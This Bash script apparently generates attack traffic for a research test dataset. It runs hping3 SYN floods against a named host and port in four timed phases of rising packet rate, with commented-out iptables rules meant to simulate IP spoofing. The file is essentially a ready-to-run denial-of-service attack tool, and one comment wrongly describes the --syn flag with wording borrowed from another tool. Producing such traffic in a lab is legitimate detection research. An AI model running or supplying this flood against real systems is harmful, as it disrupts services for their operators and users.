#!/bin/bash

display_usage() {
  echo -e "Script to run hping3 for test dataset."
  echo -e "Runtime: 32min."
  echo -e "    00-08min at u300."
  echo -e "    08-16min at u200."
  echo -e "    16-24min at u100."
  echo -e "    24-32min at u050."

  echo -e "\nUsage:"
  #echo -e "\t$0 <START_TIME> <IFACE> <HOSTNAME> <PORT> <INTERVAL> <TIMEOUT> [-q]\n"
  echo -e "\t$0 <START_TIME> <IFACE> <HOSTNAME> <PORT> [-q]\n"
  echo -e "\nOptions:"
  echo -e "\t   START_TIME - Time do start in 24h format (08:10:00, 14:20:00)."    
  echo -e "\t        IFACE - Network interface"
  echo -e "\t     HOSTNAME - Hostname under attack."
  echo -e "\t         PORT - TCP port"
  # echo -e "\t     INTERVAL - Number of seconds or micro seconds between sending each packet."
  # echo -e "\t                  X : set wait to X seconds"
  # echo -e "\t                  uX : set wait to X micro seconds"
  # echo -e "\t                  flood : set flood mode. Sent packets as fast as possible."
  #echo -e "\t      TIMEOUT - Amount of time it should run [10s, 30m, 1h, 1d]. 0 runs indefinitely."
  echo -e "\t-q (optional) - Quiet output. Nothing is displayed except the summary lines at startup time and when finished. \n"
}

# If less than two arguments supplied, display usage.
if [  $# -lt 4 ]
then
    display_usage
    exit 1
fi

START_TIME=$1
IFACE=$2
DST_HOST=$3
PORT=$4
#INTERVAL=$5
#TIMEOUT=$6
TIMEOUT=8m
QUIET=$5


# Get nic interface IP to add firewall rule
IFACE_IP=$(ip a l $IFACE | awk '$1 == "inet" {print $2}' | cut -d/ -f1 | paste -sd ',')

OPTS=""
TIMEOUT_CMD=""

if [ "$TIMEOUT" != "0" ]; then
  TIMEOUT_CMD="timeout -s SIGINT $TIMEOUT"
fi

# if [ "$INTERVAL" == "flood" ]; then
#     OPTS="--flood"
# else
#     OPTS="-i $INTERVAL"
# fi

if [[ -n $QUIET ]]; then
  OPTS=$OPTS" "$QUIET
fi

# ADD firewall rule to block SYN-ACK/ACK
# To simulate IP Spoofing // Openstack has protection against IP Spoofing
#echo -e "\nAdding firewall rule to block SYN-ACK/ACK..."
#iptables -A OUTPUT -s $IFACE_IP -d $DST_HOST -p tcp --dport 80 ! --syn -j DROP


# hping3 params:
#    --syn : Instructs siege how long to delay (in seconds) between each page request.
#       -i : Wait  the  specified  number of seconds or micro seconds between sending each packet.
#            --interval X set wait to X seconds, --interval uX set wait to X micro seconds.
#  --flood : Sent packets as fast as possible. This is ways faster than to specify the -i u0 option.
#       -p : Set destination port.

#$TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -i u300 -p $PORT $DST_HOST


TIME_SLEEP=$(( $(date -d $START_TIME +%s) - $(date +%s) ))
if [ $TIME_SLEEP -lt 0 ]
then
  echo -e "\nInvalid start time!\n"
  exit 0
fi

# SLEEP TO START_TIME
echo -e "\nWaiting to start at $(date -d $START_TIME +'%D %T %:z')."
sleep $TIME_SLEEP

echo -e "\nRunning u300 interval... " ; $TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -i u300 -p $PORT $DST_HOST &> hping_log_u300.log
echo -e "\nRunning u200 interval... " ; $TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -i u200 -p $PORT $DST_HOST &> hping_log_u200.log
echo -e "\nRunning u100 interval... " ; $TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -i u100 -p $PORT $DST_HOST &> hping_log_u100.log
echo -e "\nRunning u050 interval... " ; $TIMEOUT_CMD hping3 -I $IFACE --syn $OPTS -i u050 -p $PORT $DST_HOST &> hping_log_u050.log


# DELETE firewall rule to block send SYN-ACK/ACK
#echo -e "\nRemoving firewall rule..."
#iptables -D OUTPUT -s $IFACE_IP -d 10.50.1.110 -p tcp --dport 80 ! --syn -j DROP

echo ""
